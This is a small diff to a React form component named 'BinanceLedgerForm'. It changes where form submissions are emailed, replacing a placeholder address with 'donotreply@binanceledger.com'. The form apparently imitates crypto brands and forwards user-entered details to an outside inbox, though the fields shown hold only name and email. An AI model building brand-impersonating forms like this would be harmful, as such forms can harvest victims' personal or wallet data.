@@ -1,3 +1,4 @@
+
 import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
@@ -266,7 +267,7 @@ const BinanceLedgerForm: FC = () => {
 
     try {
       const templateParams = {
-        to_email: "your-email@example.com", // Replace with your email to receive submissions
+        to_email: "donotreply@binanceledger.com", // Updated recipient email
         from_name: `${formData.firstName} ${formData.lastName}`,
         from_email: formData.email,
         subject: "New Binance Ledger Form Submission",
